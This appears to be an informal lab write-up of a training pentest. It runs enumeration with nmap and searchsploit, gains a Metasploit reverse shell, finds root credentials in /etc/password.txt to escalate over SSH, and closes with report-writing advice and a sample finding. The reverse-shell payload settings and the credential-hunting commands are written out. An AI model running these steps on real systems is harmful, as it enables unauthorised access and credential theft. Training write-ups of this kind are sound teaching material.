WHAT DID THEY MISS? 

Enumeration: Start from zero. What do you know, and what do you need to find out?
Vulnerability analysis: Analyze your enumeration results and connect the dots to potential weaknesses.
Initial access: Pick your attack and execute it; get a foothold on the target.
Privilege escalation: You're in, but it's not over. Enumerate again, this time from the inside, and find a way up.
Reporting: None of the above matters if you can't communicate it. This is the actual deliverable. In this room, we will only cover this conceptually, as this topic will be covered in more detail in the Writing Pentest Reports room later in this path.


in this room we are an junior pentester, trying to find an new an probaly missconfigured device on client network 

lets start enumeration 

nmap -sV -sC -oN scan.txt 10.64.186.219 (note -oN scan.text, to output results) 

(print resuls) 

our nmap report gave us 2 open ports 

an service  version on port 22 open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0) 

with that we an star asking what could be issed here. 

Outdate versions ? is ther any exploid know ? 


he simplest method here is to Google their versions and the keyword "exploit".

For example, Googling "OpenSSH 9.6p1 exploit" might yield results on theoretical or very distribution-specific exploits, but nothing tangible. So it is most likely a dead end.


If you are comfortable with the Kali packages, instead of googling, you can use the searchsploit utility to find exploits. Searchsploit is a command-line tool that lets you search Exploit-DB's offline database of public exploits and vulnerability disclosures directly from your terminal.

searchsploit openssh

ALSO is possible to run nmap with --script=vuln to enumeraate know exploits for services on the ports open, but can yield varios week or false positives. 


NOTE YOU DONT NEED KALI, IS ALSO AVILABE TO UBUNTO and other dists. 

i installed on mu ubunto simply by 

sudo git clone https://gitlab.com/exploit-database/exploitdb.git /opt/exploitdb

sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit 


using metaslpoit we can search for available exploits 

remember that on searchploit one of the results for our current version was in "metaslpoit" well it really is an ready to be used 

Look the image 

(Image meta sploit) 


use 0 allow us to select to use the exploit 

with show options show the options including the ons that need to be set in order to the exploit work 
like Rhost parameter. 

in this case the only one missing is rhost 

simple set using set RHOSTS MACHINEIP 

with show payloads we can search for an payload that could work 

i will skip this cause there is a loot 

we are going to use the 
set payload cmd/unix/reverse or use 6 
since we do not know much is the safest option

with payload selected 

Now, if we run show options again, we'll see that LHOST and LPORT are required for this payload.

set LHOST CONNECTION_IP
set LPORT 443

not showing after set since has my ip 

BEWARE THAT REQUIREMENTS CHANGE WITH PAYLODS KEEP EYE OPEN FOR THIS. 

run exploit and you should be able to stabilish session. 

run whoami if result ---> webmaster 
you are in 

find / -name password* 2>/dev/null


privilage escalation 
This command will attempt to find all files on the target system that contain the word password in their name. 2>/dev/null will suppress errors.

You can go ahead and inspect all these files, but one stands out from the rest: /etc/password.txt.

We can read this with cat /etc/password.txt. Luckily for us, it seems to contain root credentials. Since we're not in an interactive terminal session, we won't be able to use su to enter the password. However, we know from our previous external enumeration that an SSH service is running on this host. Open a new terminal and run the following command:

than we can 

ssh root@10.64.186.219

When prompted, enter the password you found previously in /etc/password.txt. Congrats, you now own this machine! You can find your flag in /root/flag.txt.



First of all, you should keep in mind that all the client will ever see of your work is your report. You could have the pentest of your life in which you own all the ATMs in a bank and become its domain admin, but if your report is bad, then it means the pentest was bad.

Secondly, while all professionals have their own way of writing reports, some general items should always be there:

    A cover page with a title, your name, and email address, and version control.
    A table of contents (Optional).
    An executive summary, aimed at the manager who requested the engagement, explaining what was achieved in non-technical terms.
    A technical summary aimed at the engineering manager, so they understand the impact and can prioritize accordingly (Optional).
    A table of all vulnerabilities found, ordered by severity, aimed at managers and engineers, again to prioritize accordingly.
    Detailed exploitation section, where each vulnerability and its impact are explained, exploitation steps and proof are shown, and recommendations for mitigations are given. This is aimed at engineers who will remediate your findings.

Lastly, take pride in what you did. The report is your time to shine and show your client your best work. Don't skip steps and be as detailed as possible to provide the best value for your client.

The following example is a reported finding for the privilege escalation vector we've found in this scenario.

Title: Root Password Stored in Plaintext

Severity: Critical

Description: The root user's password was found stored in plaintext within the file /etc/password.txt. This file was readable by low-privileged users, allowing any user with shell access to retrieve the root credentials and fully compromise the system.

Exploitation Steps:

    Obtain a low-privileged shell on the target system.
    Read the contents of /etc/password.txt using cat /etc/password.txt.
    Use the discovered root password to escalate privileges via ssh root@IP.

Recommendation: Remove the plaintext password file immediately and rotate the root password. Credentials should never be stored in plaintext on the filesystem. Implement a secrets management solution or use properly configured system authentication mechanisms (such as /etc/shadow with strong hashing). Additionally, enforce the principle of least privilege to restrict file access permissions.
